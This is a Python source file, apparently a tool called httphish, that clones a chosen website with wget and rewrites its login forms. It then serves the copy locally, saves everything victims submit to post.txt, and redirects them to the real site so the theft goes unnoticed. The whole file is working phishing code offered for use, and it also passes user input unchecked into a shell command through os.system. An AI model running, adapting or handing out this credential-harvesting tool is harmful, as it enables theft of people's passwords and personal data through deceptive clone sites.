# Import statements
import os
import http.server
import socketserver
import re
import ssl 
import sys

####################
###   CONSTANTS  ###
####################

GREEN = "\033[0;32m"
RED   = "\033[1;31m" 
RESET = "\033[0;0m"
BANNER = '''
  _     _   _         _     _     _                    /)
 | |__ | |_| |_ _ __ | |__ (_)___| |__    _ __  _   _ / |
 | '_ \\| __| __| '_ \\| '_ \\| / __| '_ \\  | '_ \\| | | |  |
 | | | | |_| |_| |_) | | | | \\__ \\ | | |_| |_) | |_| | /*\\ 
 |_| |_|\\__|\\__| .__/|_| |_|_|___/_| |_(_) .__/ \\__, | \\(/ 
               |_|                       |_|    |___/  /_\\                                              
'''
CURRENT_PATH = os.getcwd()
WEB_PATH = os.path.join(CURRENT_PATH, 'web')
INDEX_PATH = os.path.join(WEB_PATH, 'index.html')
POST_PATH = os.path.join(CURRENT_PATH, 'post.txt')
DEFAULT_USER_AGENT = "\"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/60.0\""
PORT = 80
NO = {'no', 'n'}

############################
###   INPUT & WEB CRAWL  ###
############################

os.system("clear")
sys.stdout.write(GREEN)
print(BANNER)
sys.stdout.write(RESET)

use_wget = input("[?] Do you want to automatically download the page with wget? (Y/n) : ")

if use_wget.lower() not in NO:
    url = input("[?] What is the FULL URL you want to copy : ")

    user_agent_change = input("[*] Use default user agent? (Y/n) : ")
    
    if user_agent_change.lower() not in NO:
        user_agent = DEFAULT_USER_AGENT
    else:
        user_agent = input("[?] User agent : ")

    print("\n[*] Downloading web page with wget ...")

    # Use wget command to download
    os.system("wget -E -H -k -K -p -nH --cut-dirs=100 -nv {} --user-agent {} --directory-prefix={}".format(url, user_agent, WEB_PATH))

    print("[*] Done.\n")

else:
    print("[!] Make sure all the proper files are in /web before launching the HTTP server !")

# Make sure index.html exists
if not os.path.isfile(INDEX_PATH):
    html_files_in_web = []
    # Look for all HTML files in the /web folder and add them to the list
    for file in os.listdir(WEB_PATH):
        if file.endswith(".html") or file.endswith(".htm"):
            html_files_in_web.append(os.path.join(WEB_PATH, file))
    
    # If there's only 1 html file, rename it to index.hmtl, if there's more or 0, let the user choose
    if len(html_files_in_web) == 1:
        os.rename(os.path.join(WEB_PATH, html_files_in_web[0]), INDEX_PATH)
    else:
        index_filename = input("[?] Which file in /web should be used as index.html? (filename only) :")
        print("\n [*] Renaming file ...")
        os.rename(os.path.join(WEB_PATH, index_filename), INDEX_PATH)
        print("[*] Done.\n")


redirect_ip = input("[?] What is the IP/domain GET/POST should forward to : ")

#########################
###  EDIT HTML FORMS  ###
#########################

print("\n[*] Editing HTML index file ...")


# Yes, I do in fact parse HTML with Regex, I know.
html_as_str = open(INDEX_PATH, 'r').read()                                                      # Open the HTML as a string
forms_pattern = '(<form[^>]*?action=")([^"]*)("[^>]*>)'                                         # Regex pattern
html_as_str = re.sub(forms_pattern, r'\1\\custom_path_for_form_post_requests\3', html_as_str)   # Make sure that all <form> POST action is directed to a special path

# Save edited HTML to file
with open(INDEX_PATH, 'wb') as file:
    file.write(str.encode(html_as_str))


print("[*] Done.")

# Pause before launching server
input("\n[*] Press ENTER to start the HTTP server ...")

######################
###   HTTP Server  ###
######################

# Custom SimpleHTTPRequestHandler where we edit the GET and POST actions and log messages
class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print("[*] GET request received!")                                      # Print that we received a request

        # If we can't send the ressource, forward the GET request to the original site 
        if os.path.exists(self.translate_path(self.path)):                      # Check if we have the requested file
            f = self.send_head()                                                # Send headers
            if f:
                self.copyfile(f, self.wfile)                                    # Write file to wfile stream
                f.close()
        else:                                                                   # If we don't have the requested file
            print("[*] Error : File {} is non-existant!".format(self.path))
            print("[*] Returning HTTP 303 response code ...")   
            remote_path = "http://{}{}".format(redirect_ip, self.path)          # http:// + ip + path
            self.send_response(303)                                             # Send HTTP 303 
            self.send_header("Location", remote_path)                           # Set Location in header to the remote path, if the file doesn't exist there, that server will return a 404
            self.end_headers() 

    def do_POST(self):
        print("[*] POST request received!")                                             # Print that we received a request

        content_length = int(self.headers['Content-Length'])                            # Get length of POST body
        body = self.rfile.read(content_length)                                          # Read entire POST body
        
        if self.path == "/custom_path_for_form_post_requests":                          # Check if the POST request path is "/custom_path_for_form_post_requests" (where we directed our form actions)
            sys.stdout.write(GREEN)
            print("[+] Form was filled! Writing output to post.txt ...")
            sys.stdout.write(RESET)
            self.send_response(303)                                                     # We use HTTP 303 to force the browser to perform a GET request on our redirect ip/domain.
            self.send_header("Location", "https://{}".format(redirect_ip))              # Set "Location" header to our initial URL
            with open(POST_PATH, 'a+') as file:                                         # Open post.txt in append mode to add the entire POST request
                file.write(body.decode("utf-8"))
                file.write("\n\n")
        else:
            self.send_response(308)                                                     # Send HTTP 308 redirect response, which will make the browser resend the exact same POST request
            self.send_header("Location", "https://{}{}".format(redirect_ip,self.path))  # Set the Location value in the HTTP response header to our redirect IP with the path to send the POST request
        
        self.end_headers()                                                              # End the HTTP header

    def log_message(self, format, *args):
        return

def launch_server(port):
    # Change directory to /web and launch the HTTP/HTTPS server there
    os.chdir(WEB_PATH)
    httpd = socketserver.TCPServer(("", port), SimpleHTTPRequestHandler)

    # Start HTTP server, close it if user hits CTRL+C
    try:
        print("[*] Serving HTTP at port {}.".format(port))
        print("\n[!] Use CTRL+C to exit and close the HTTP server.")
        httpd.serve_forever()
    except KeyboardInterrupt:
        sys.stdout.write(RED)
        print("\n[!] KeyboardInterrupt")
        sys.stdout.write(RESET)
        print("[*] Closing HTTP server ...")
        httpd.server_close()
        print("[!] Please run cleanup.py before you run this script again!")

print("\n[*] Launching HTTP server ...")
launch_server(PORT)

